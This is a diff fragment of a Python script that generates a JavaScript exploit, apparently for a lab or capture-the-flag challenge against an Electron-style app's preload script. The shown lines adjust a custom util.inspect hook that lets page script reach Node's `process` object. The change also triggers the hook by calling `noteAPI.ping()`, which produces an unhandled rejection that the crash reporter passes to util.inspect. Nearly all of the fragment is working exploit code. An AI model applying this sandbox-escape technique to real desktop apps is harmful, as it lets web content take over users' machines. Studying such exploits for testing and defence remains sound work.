@@ -156,15 +156,18 @@ exploit_js = textwrap.dedent(f"""\
                 }}
                 // Return `this` so util.inspect treats `ret === context`
                 // and falls through to default property-walking — that's
-                // how the recursion eventually reaches `proc: process`
+                // how the recursion eventually reaches `runtime: process`
                 // and re-invokes us with `this = process`.
                 return this;
             }},
         }});
 
-        // No noteAPI call. The preload's setInterval watchdog calls
-        // util.inspect({{ proc: process, ... }}, {{ depth: 2 }}) once
-        // a second; recursion walks into `process` and our hook fires.
+        // Fire the preload's crash reporter. noteAPI.ping() rejects
+        // (no IPC handler in main) — leaving it un-caught becomes an
+        // unhandledrejection event, which the preload reports through
+        // util.inspect({{ runtime: process, ... }}). The recursion walks
+        // into `process` and our hook fires.
+        window.noteAPI.ping();
     }})();
 """)
 
